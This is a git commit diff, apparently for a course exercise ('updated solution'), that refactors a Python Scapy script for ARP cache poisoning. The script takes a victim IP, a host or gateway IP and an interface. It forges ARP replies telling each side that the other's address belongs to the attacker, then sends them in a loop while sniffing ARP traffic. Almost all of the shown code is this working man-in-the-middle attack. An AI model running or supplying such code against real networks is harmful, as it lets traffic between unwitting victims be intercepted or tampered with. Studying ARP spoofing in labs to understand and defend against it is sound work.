a400e9c5708de3b4124d5c79533f229cd8ba8439
Cameron Betz <cameronleebetz@gmail.com>
2018-10-21 12:05:16 -0600

    updated solution

--- arpSpoof/arpSpoofScapy.py
+++ arpSpoof/arpSpoofScapy.py
@@ -4,7 +4,6 @@ import os
 from argparse import ArgumentParser
 from scapy.all import *
 
-
 IP_FORWARD = '/proc/sys/net/ipv4/ip_forward'
 TIMEOUT = 3
 RETRY = 12
@@ -12,15 +11,13 @@ RETRY = 12
 def configuration():
     parser = ArgumentParser()
 
-    
     parser.add_argument('-t', dest='victim', required=True, type=str, help='The victim\'s IP address')
-    parser.add_argument('-g',  dest='host', required=True, type=str, help='The host\'s IP address')
+    parser.add_argument('-r',  dest='host', required=True, type=str, help='The host\'s IP address')
     parser.add_argument('-i',  dest='interface', required=True, type=str, help='Use this network interface')
 
     args = parser.parse_args()
 
     return {
-
         'victim' :  {
 
             'ip' : args.victim,
@@ -33,47 +30,41 @@ def configuration():
         },
 
         'iface' : args.interface,
-        
     }
 
 def poisonExecute(configs):
-
+    victimMac = configs['victimMac']
+    hostMac = configs['hostMac']
     
-    victim_mac = configs['victim_mac']
-    host_mac = configs['host_mac']
-    
-    victim_ip = configs['victim_ip']
-    host_ip = configs['host_ip']
+    victimIP = configs['victimIP']
+    hostIP = configs['hostIP']
  
-    victim_arp = ARP()
+    victimARP = ARP()
     host_arp = ARP()
 
-    victim_arp.op = 2
+    victimARP.op = 2
     host_arp.op = 2
     
-    victim_arp.hwdst = victim_mac
-    host_arp.hwdst = host_mac
+    victimARP.hwdst = victimMac
+    host_arp.hwdst = hostMac
 
-    victim_arp.pdst = victim_ip
-    host_arp.pdst = host_ip
+    victimARP.pdst = victimIP
+    host_arp.pdst = hostIP
 
-    victim_arp.psrc = host_ip
-    host_arp.psrc = victim_ip
+    victimARP.psrc = hostIP
+    host_arp.psrc = victimIP
 
     while True:
-
         try:
-
             print('Poisoning....')
             
             # send spoofed arp replies
-            send(victim_arp)
+            send(victimARP)
             send(host_arp)
 
             # wait for ARP replies from default GW or victim
             sniff(filter='arp and host %s or %s' %\
-                        (host_ip, victim_ip), count=1)
-
+                        (hostIP, victimIP), count=1)
 
         # break out of loop if user hits ctrl+c
         except KeyboardInterrupt:
